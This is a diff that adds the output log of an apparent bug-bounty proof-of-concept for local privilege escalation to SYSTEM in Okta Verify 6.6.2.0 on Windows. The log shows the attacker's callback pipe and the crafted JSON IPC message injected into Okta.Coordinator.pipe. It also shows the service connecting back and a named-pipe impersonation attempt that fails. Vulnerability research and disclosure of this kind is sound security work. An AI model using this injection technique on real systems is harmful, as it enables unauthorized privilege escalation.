@@ -1,0 +1,38 @@
+[20:56:36.854] ========================================
+[20:56:36.874] Okta Verify 6.6.2.0 - SYSTEM LPE PoC
+[20:56:36.874] ========================================
+[20:56:36.874] Mode: impersonation
+[20:56:36.874] 
+[20:56:36.878] --- Current Process Identity ---
+[20:56:36.881] User:            SKINNYD\uglyt
+[20:56:36.881] Is Admin:        False
+[20:56:36.882] Integrity Level: High (0x3000)
+[20:56:36.885] Impersonation:   None
+[20:56:36.885] 
+[20:56:36.885] ============================================
+[20:56:36.885] TEST 2: SYSTEM Named Pipe Impersonation
+[20:56:36.885]          via PipeName Callback Injection
+[20:56:36.886] ============================================
+[20:56:36.892] [Step 1] Creating callback pipe: okta-lpe-119d597f64da4e33b9bd570fea75fd60
+[20:56:36.895] Pipe server created. Listening on \\.\pipe\okta-lpe-119d597f64da4e33b9bd570fea75fd60
+[20:56:36.896] [Step 2] Waiting for SYSTEM to connect (up to 30s)...
+[20:56:37.206] [Step 3] Injecting IPC message with PipeName=okta-lpe-119d597f64da4e33b9bd570fea75fd60
+[20:56:37.243]   Serialized message (332 bytes): {"ArtifactType":"OktaVerify","AutoUpdateUrl":"https:\/\/bugcrowd-pam-4593.oktapreview.com","BucketId":"0","CurrentInstalledVersion":{"_Build":0,"_Major":1,"_Minor":0,"_Revision":0},"EventLogName":"Okta Verify","EventSourceName":"OktaVerify","PipeName":"okta-lpe-119d597f64da4e33b9bd570fea75fd60","ReleaseChannel":"GA","UserId":null}
+[20:56:37.243]   Connecting to \\.\pipe\Okta.Coordinator.pipe...
+[20:56:37.243]   Connected.
+[20:56:37.244]   Message written, flushed, and drained.
+[20:56:37.244]   Pipe closed. Server should now process the message.
+[20:56:37.244] [Step 4] Waiting for SYSTEM callback (up to 120 seconds)...
+[20:56:38.257] 
+[20:56:38.257] *** CONNECTION RECEIVED on callback pipe! ***
+[20:56:38.257] Pipe connected: True
+[20:56:38.257] [Step 5] Calling ImpersonateNamedPipeClient()...
+[20:56:38.257] ImpersonateNamedPipeClient failed (Win32 error 1368)
+[20:56:38.263] Data from SYSTEM (249 bytes): {"Databag":{"OrgUrl":"https:\/\/bugcrowd-pam-4593.oktapreview.com","Channel":"GA","ArtifactType":"OktaVerify","CurrentVersion":"1.0.0.0","TotalTimeMS":"0","OperationMS":"0","BucketId":"0"},"EndConnection":true,"Exception":null,"NotificationType":12}
+[20:56:38.263] 
+[20:56:38.263] ========================================
+[20:56:38.263] FINAL RESULTS
+[20:56:38.263] ========================================
+[20:56:38.263] Test 2 (Impersonation): FAILED
+[20:56:38.263] ========================================
+[20:56:38.265] Evidence log saved to: C:\Windows\Temp\okta-lpe-evidence.log
